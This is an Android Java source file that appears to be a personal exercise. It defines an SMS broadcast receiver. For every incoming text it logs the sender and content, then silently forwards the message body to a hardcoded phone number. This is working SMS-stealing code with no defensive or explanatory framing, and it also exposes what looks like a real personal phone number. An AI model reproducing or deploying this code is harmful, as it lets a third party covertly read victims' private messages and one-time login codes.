package com.example.supergao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * 短信广播接收者
 * 
 * @author gao
 * 
 */
public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// 获得数据
		Bundle bundle = intent.getExtras();
		Object[] objects = (Object[]) bundle.get("pdus");
		for (Object ob : objects) {
			// 创建短信对象
			SmsMessage sms = SmsMessage.createFromPdu((byte[]) ob);
			// 短信来源电话号码
			String phone = sms.getOriginatingAddress();
			// 短信内容
			String body = sms.getMessageBody();
			Log.i("superGao", phone + ":" + body);
			// 将短信转发到我的电话
			String myphone = "15802982964";
			// 获取发送短信的api
			SmsManager sm = SmsManager.getDefault();

			sm.sendTextMessage(myphone, null, body, null, null);

			// 把长短信拆分成若干条短短信
			/*ArrayList<String> smss = sm.divideMessage(body);

			for (String content : smss) { 
				// arg0:接收短信的号码,arg1:短信服务中心的号码,arg2：短信内容
				sm.sendTextMessage(myphone, null, content, null, null);
			}*/

		}

	}

}
